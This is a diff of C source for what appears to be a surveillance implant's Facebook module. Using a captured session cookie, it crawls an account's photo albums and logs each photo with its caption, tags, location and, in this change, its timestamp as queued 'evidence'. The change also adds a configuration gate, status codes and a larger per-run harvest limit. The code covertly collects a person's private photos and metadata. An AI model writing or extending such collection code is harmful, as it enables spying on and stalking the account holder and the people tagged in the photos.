@@ -24,13 +24,14 @@
 #define URL_SIZE_IN_CHARS	2048
 
 /* facebook defines  */
-#define FBID_TAG			"data-fbid=\""
-#define FBID_TOKEN			"\"token\":\""
-#define FBID_PHOTO_URL		"id=\"fbPhotoImage\" src=\"https://"
-#define FBID_PHOTO_CAPTION  "<span class=\"hasCaption\">"
-#define FBID_PHOTO_TAG_LIST	"<span class=\"fbPhotoTagList\" id=\"fbPhotoPageTagList\">"
-#define FBID_PHOTO_TAG_ITEM "<span class=\"fbPhotoTagListTag tagItem\">"
-#define FBID_PHOTO_LOCATION "in <span class=\"fbPhotoTagListTag withTagItem tagItem\">"
+#define FBID_TAG			 "data-fbid=\""
+#define FBID_TOKEN			 "\"token\":\""
+#define FBID_PHOTO_URL		 "id=\"fbPhotoImage\" src=\"https://"
+#define FBID_PHOTO_CAPTION   "<span class=\"hasCaption\">"
+#define FBID_PHOTO_TAG_LIST	 "<span class=\"fbPhotoTagList\" id=\"fbPhotoPageTagList\">"
+#define FBID_PHOTO_TAG_ITEM  "<span class=\"fbPhotoTagListTag tagItem\">"
+#define FBID_PHOTO_LOCATION  "in <span class=\"fbPhotoTagListTag withTagItem tagItem\">"
+#define FBID_PHOTO_TIMESTAMP "fbPhotoPageTimestamp"
 
 typedef struct _facebook_photo_id {
 	UINT64	fbid;			// key
@@ -514,6 +515,59 @@ LPSTR FacebookPhotoExtractPhotoLocation(__in LPSTR strCookie, __in LPSTR strHtml
 }
 
 /*
+	Description:	extracts the epoch timestamp  from a Facebook photo specific page
+	Params:			Facebook photo specific page
+	Usage:			returns null or a string containing the epoch timestamp, which must be freed by the caller. Input page is modified temporary.
+					
+*/
+LPSTR FacebookPhotoExtractTimestamp(__in LPSTR strHtmlPage)
+{
+	/* allocations:
+		- strTimestamp is allocated and returned to the caller
+	*/
+
+	LPSTR strParser1, strParser2;
+	CHAR chTmp;
+	LPSTR strTimestamp = NULL;
+
+	strParser1 = strstr(strHtmlPage, FBID_PHOTO_TIMESTAMP);
+	if (!strParser1)
+		return NULL;
+	
+	strParser1 += strlen(FBID_PHOTO_TIMESTAMP);
+	strParser1 = strstr(strParser1, "data-utime=\"");
+	if (!strParser1)
+		return NULL;
+
+	strParser1 += strlen("data-utime=\"");
+
+	strParser2 = strstr(strParser1, "\"");
+	if (!strParser2)
+		return NULL;
+
+	/* temporary change input page */
+	chTmp = *strParser2;
+	*strParser2 = NULL;
+
+#ifdef _DEBUG
+	OutputDebug(L"[*] %S - timestamp url: %S\n", __FUNCTION__, strParser1);
+#endif
+
+	size_t timestampLength = strlen(strParser1) + 1;
+	strTimestamp = (LPSTR) zalloc_s(timestampLength);
+	if (!strTimestamp)
+		return NULL;
+
+	strncpy_s(strTimestamp, timestampLength, strParser1, _TRUNCATE);
+
+	/* restore input page */
+	*strParser2 = chTmp;
+
+	return strTimestamp;
+}
+
+
+/*
 	Description:	append to strAppendMe a snprintf' of strFormat and strConsumed
 	Params:			string to be appended, format string with a %s (e.g. \"description\": \"%s\", ";), string sprintf'd into the format string
 	Usage:			changes strAppendMe, by reallocating  and appending.
@@ -550,17 +604,21 @@ VOID FacebookPhotoLogJsonAppend(LPSTR* strAppendMe, __in LPCSTR strFormat, __in 
 
 /* 
 	Description:	prepare and queue a complete photo log (blob + metadata) for a single fbid
-	Params:			photo blob, its size, caption, tags, location, path 
+	Params:			photo blob, its size, caption, tags, location, path, timestamp
 	Usage:			-
 					
 */
-VOID FacebookPhotoLog(__in LPBYTE lpPhotoBlob, __in ULONG uSize, __in LPSTR strCaption, __in LPSTR strTags, __in LPSTR strLocation, __in LPSTR strPhotoPath)
+VOID FacebookPhotoLog(__in LPBYTE lpPhotoBlob, __in ULONG uSize, __in LPSTR strCaption, __in LPSTR strTags, __in LPSTR strLocation, __in LPSTR strPhotoPath, __in LPSTR strTimestamp)
 {
 	/* allocations:
 		- strJsonLog contain the full json log and before queuing the evidence the null termination is removed, beware
 	*/
 	LPSTR strJsonLog = NULL;
 	size_t strJsonLogSize = 0;
+
+	// photo blob is mandatory
+	if (!lpPhotoBlob)
+		return;
 
 	// program
 	LPCSTR strProgramJson = "{ \"program\": \"Facebook\", \"device\": \"Desktop\", ";
@@ -669,6 +727,14 @@ VOID FacebookPhotoLog(__in LPBYTE lpPhotoBlob, __in ULONG uSize, __in LPSTR strC
 			}
 		}
 	}
+
+	// timestamp
+	if (strTimestamp)
+	{
+		LPCSTR strTimestampTemplate = "\"time\": %s, ";
+		FacebookPhotoLogJsonAppend(&strJsonLog, strTimestampTemplate, strTimestamp);
+	}
+
 	// close json
 
 #ifdef _DEBUG
@@ -754,8 +820,11 @@ VOID FacebookPhotoHandleSinglePhoto(__in LPSTR strCookie,  facebook_photo_id *fb
 	/*	e] optional - location */
 	LPSTR strLocation = FacebookPhotoExtractPhotoLocation(strCookie, strRecvBuffer);
 
+	/*  f] optional - timestamp */
+	LPSTR strEpochTimestamp = FacebookPhotoExtractTimestamp(strRecvBuffer);
+
 	/* log all the things */
-	FacebookPhotoLog(strRecvPhoto, uSize, strCaption, strTags, strLocation, strPhotoBlobPath);
+	FacebookPhotoLog(strRecvPhoto, uSize, strCaption, strTags, strLocation, strPhotoBlobPath, strEpochTimestamp);
 
 	/* cleanup */
 	if (strRecvPhoto)
@@ -772,6 +841,9 @@ VOID FacebookPhotoHandleSinglePhoto(__in LPSTR strCookie,  facebook_photo_id *fb
 
 	if (strLocation)
 		zfree_s(strLocation);
+
+	if (strEpochTimestamp)
+		zfree_s(strEpochTimestamp);
 	
 	zfree_s(strRecvBuffer); 
 }
@@ -1147,21 +1219,27 @@ VOID FacebookPhotoCrawlAlbums(__in LPSTR strCookie, __in LPSTR strUserId, __in L
 	Usage:			-
 
 */
-VOID FacebookPhotoHandler(__in LPSTR strCookie)
+DWORD FacebookPhotoHandler(__in LPSTR strCookie)
 {
 	/*	allocations:
 			- items of hash_head are allocated by the crawling functions and freed in the handle loop
 			- strSocialUsername_* allocated and free'd before the handle loop
 	*/
 
+
+
 	/* hash declaration */
 	facebook_photo_id *hash_head = NULL;
 	
-	
 	LPSTR strUserId, strScreenName;
 
+
+	if (!ConfIsModuleEnabled(L"photo"))
+		return SOCIAL_REQUEST_SUCCESS;
+
+
 	if (!FacebookGetUserInfo(strCookie, &strUserId, &strScreenName))
-		return;
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 
 	
 	/*  0] fetch Photo page, e.g.:
@@ -1173,7 +1251,7 @@ VOID FacebookPhotoHandler(__in LPSTR strCookie)
 
 	LPWSTR strUrl = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS *sizeof(WCHAR));
 	if (!strUrl)
-		return;
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 
 	_snwprintf_s(strUrl, URL_SIZE_IN_CHARS , _TRUNCATE, L"/profile.php?id=%S&sk=photos", strUserId);
 
@@ -1188,7 +1266,7 @@ VOID FacebookPhotoHandler(__in LPSTR strCookie)
 	{
 		zfree_s(strScreenName);
 		zfree_s(strUserId);
-		return;
+		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
 
 	/* 1] Photos of You */
@@ -1208,7 +1286,7 @@ VOID FacebookPhotoHandler(__in LPSTR strCookie)
 
 	// 0 -> PHOTOS_YOURS
 	// 1 -> PHOTOS_OF_YOU
-	DWORD dwMaxItemsPerRun_0 = 20, dwMaxItemsPerRun_1 = 20;
+	DWORD dwMaxItemsPerRun_0 = 30, dwMaxItemsPerRun_1 = 30;
 	DWORD dwCurrentItemsPerRun_0 = 0, dwCurrentItemsPerRun_1 = 0;
 	UINT64 highestBatchFbid_0 = 0, highestBatchFbid_1 = 0;
 
@@ -1288,5 +1366,6 @@ VOID FacebookPhotoHandler(__in LPSTR strCookie)
 	zfree_s(strUserId);
 	zfree_s(strRecvBuffer);
 	
+	return SOCIAL_REQUEST_SUCCESS;
 }
 
